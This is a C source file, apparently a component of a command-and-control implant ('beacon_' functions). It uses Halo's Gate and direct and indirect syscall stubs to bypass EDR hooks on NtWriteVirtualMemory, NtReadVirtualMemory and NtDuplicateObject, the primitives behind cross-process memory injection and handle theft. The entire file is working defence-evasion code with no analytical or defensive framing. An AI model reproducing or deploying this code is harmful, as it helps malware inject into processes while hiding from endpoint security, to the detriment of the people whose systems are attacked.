#include <Windows.h>
#include <string.h>
#include "syscalls.h"
#include "datastore.h"

typedef LONG NTSTATUS;
#ifndef NTAPI
#define NTAPI WINAPI
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

typedef NTSTATUS (NTAPI * fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI * fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI * fn_NtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);

#if defined(_M_X64)
typedef struct {
	DWORD ssn;
	BYTE * gadget; /* ntdll syscall;ret */
	BYTE * stub;   /* VirtualAlloc'd 32B page; RX except while rewritten */
} sc_entry;

static sc_entry sc_write;
static sc_entry sc_read;
static sc_entry sc_dup;
static BOOL sc_ready;

static BYTE * find_syscall_insn(BYTE * p, int maxn) {
	int i;
	for (i = 0; i < maxn - 1; i++) {
		if (p[i] == 0x0F && p[i + 1] == 0x05)
			return p + i;
	}
	return NULL;
}

static BOOL parse_nt_stub(BYTE * fn, sc_entry * out) {
	int i;
	if (fn == NULL || out == NULL)
		return FALSE;
	memset(out, 0, sizeof(*out));
	/* hooked? try Halo's Gate: walk neighboring 32-byte slots */
	if (fn[0] == 0xE9 || fn[0] == 0xFF) {
		int delta;
		for (delta = 1; delta < 16; delta++) {
			BYTE * up = fn + delta * 32;
			BYTE * down = fn - delta * 32;
			if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
				out->ssn = *(DWORD *)(up + 4) - (DWORD)delta;
				out->gadget = find_syscall_insn(up, 24);
				return out->gadget != NULL;
			}
			if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
				out->ssn = *(DWORD *)(down + 4) + (DWORD)delta;
				out->gadget = find_syscall_insn(down, 24);
				return out->gadget != NULL;
			}
		}
		return FALSE;
	}
	for (i = 0; i < 24; i++) {
		if (fn[i] == 0xB8) {
			out->ssn = *(DWORD *)(fn + i + 1);
			out->gadget = find_syscall_insn(fn, 32);
			return out->gadget != NULL;
		}
	}
	(void)i;
	return FALSE;
}

static void build_direct_stub(BYTE * dst, DWORD ssn) {
	/* mov r10, rcx; mov eax, SSN; syscall; ret */
	dst[0] = 0x4C; dst[1] = 0x8B; dst[2] = 0xD1;
	dst[3] = 0xB8;
	memcpy(dst + 4, &ssn, 4);
	dst[8] = 0x0F; dst[9] = 0x05;
	dst[10] = 0xC3;
}

static void * make_exec(sc_entry * e, int indirect) {
	DWORD old = 0;
	BYTE built[32];
	BYTE * p;

	/* The stub used to live in static .data flipped to RWX for the process
	 * lifetime. VirtualProtect is page-granular, so making the .data page
	 * non-writable would break neighbouring statics - instead give each
	 * stub its own page, build it locally, and only ever expose RW->RX
	 * (never RWX). */
	if (e->stub == NULL) {
		e->stub = (BYTE *)VirtualAlloc(NULL, 32, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (e->stub == NULL)
			return NULL;
	}
	p = e->stub;

	memset(built, 0, sizeof(built));
	if (indirect && e->gadget) {
		/* mov r10, rcx; mov eax, SSN; jmp [rip+0]; gadget */
		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
		built[3] = 0xB8;
		memcpy(built + 4, &e->ssn, 4);
		built[8] = 0xFF; built[9] = 0x25; /* jmp qword ptr [rip+0] */
		memcpy(built + 14, &e->gadget, 8);
	}
	else {
		build_direct_stub(built, e->ssn);
	}

	if (!VirtualProtect(p, 32, PAGE_READWRITE, &old))
		return NULL;
	memcpy(p, built, 32);
	if (!VirtualProtect(p, 32, PAGE_EXECUTE_READ, &old))
		return NULL;
	FlushInstructionCache(GetCurrentProcess(), p, 32);
	return p;
}

void syscalls_resolve(void) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	BYTE * w;
	BYTE * r;
	BYTE * d;
	if (ntdll == NULL)
		return;
	w = (BYTE *)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	r = (BYTE *)GetProcAddress(ntdll, "NtReadVirtualMemory");
	d = (BYTE *)GetProcAddress(ntdll, "NtDuplicateObject");
	sc_ready = parse_nt_stub(w, &sc_write) && parse_nt_stub(r, &sc_read) && parse_nt_stub(d, &sc_dup);
}

int syscalls_ssn_ntwrite(void) {
	return sc_ready ? (int)sc_write.ssn : 0;
}

static NTSTATUS sc_call_write(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T w) {
	int method = syscall_method_get();
	fn_NtWriteVirtualMemory fn;
	if (method == 0 || !sc_ready)
		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
	fn = (fn_NtWriteVirtualMemory)make_exec(&sc_write, method == 2);
	if (fn == NULL)
		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
	return fn(p, a, b, n, w);
}

static NTSTATUS sc_call_read(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T r) {
	int method = syscall_method_get();
	fn_NtReadVirtualMemory fn;
	if (method == 0 || !sc_ready)
		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
	fn = (fn_NtReadVirtualMemory)make_exec(&sc_read, method == 2);
	if (fn == NULL)
		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
	return fn(p, a, b, n, r);
}

static NTSTATUS sc_call_dup(HANDLE sp, HANDLE sh, HANDLE tp, PHANDLE th, ACCESS_MASK acc, ULONG attr, ULONG opt) {
	int method = syscall_method_get();
	fn_NtDuplicateObject fn;
	if (method == 0 || !sc_ready)
		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
	fn = (fn_NtDuplicateObject)make_exec(&sc_dup, method == 2);
	if (fn == NULL)
		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
	return fn(sp, sh, tp, th, acc, attr, opt);
}
#else
void syscalls_resolve(void) {}
int syscalls_ssn_ntwrite(void) { return 0; }
#endif

BOOL beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) {
#if defined(_M_X64)
	NTSTATUS st;
	SIZE_T wrote = 0;
	if (syscall_method_get() == 0)
		return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	st = sc_call_write(hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, &wrote);
	if (lpNumberOfBytesWritten)
		*lpNumberOfBytesWritten = wrote;
	return NT_SUCCESS(st);
#else
	return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
#endif
}

BOOL beacon_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead) {
#if defined(_M_X64)
	NTSTATUS st;
	SIZE_T got = 0;
	if (syscall_method_get() == 0)
		return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	st = sc_call_read(hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &got);
	if (lpNumberOfBytesRead)
		*lpNumberOfBytesRead = got;
	return NT_SUCCESS(st);
#else
	return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
#endif
}

BOOL beacon_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
#if defined(_M_X64)
	NTSTATUS st;
	ULONG attr;
	if (syscall_method_get() == 0)
		return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
	attr = bInheritHandle ? 0x00000002 : 0; /* OBJ_INHERIT */
	st = sc_call_dup(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, attr, dwOptions);
	return NT_SUCCESS(st);
#else
	return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
#endif
}
